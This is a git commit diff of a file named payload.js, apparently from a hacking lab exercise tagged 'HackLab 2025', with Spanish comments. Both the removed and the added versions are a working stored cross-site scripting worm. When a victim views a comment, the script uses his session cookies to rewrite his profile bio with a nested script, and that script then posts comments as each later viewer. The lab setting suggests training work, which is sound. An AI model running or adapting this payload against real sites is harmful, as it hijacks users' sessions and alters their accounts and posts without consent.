ee5dc42e4f24e0b2dcdf6afdf8bf2604270d4409
iktomy87 <62110740+iktomy87@users.noreply.github.com>
2025-10-04 15:39:01 -0300

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,13 +1,11 @@
 <script>
-setTimeout(() => {
-    // Pepe modifica su propia bio cuando ve este comentario
-    fetch('/profile', {
-        method: 'POST',
-        credentials: 'include',
-        headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: 'bio=<script>setTimeout(()=>{fetch("/comments",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"comment=Jeni fue convencida por la bio de Pepe - HackLab"})},1000)</' + 'script>'
-    });
-}, 500);
+// Cuando Pepe vea este comentario, modificará SU biografía
+fetch('/profile', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    body: 'bio=' + encodeURIComponent('<script>fetch("/comments",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"comment=¡Jeni comenta automáticamente! HackLab 2025"})</' + 'script>')
+});
 </script>
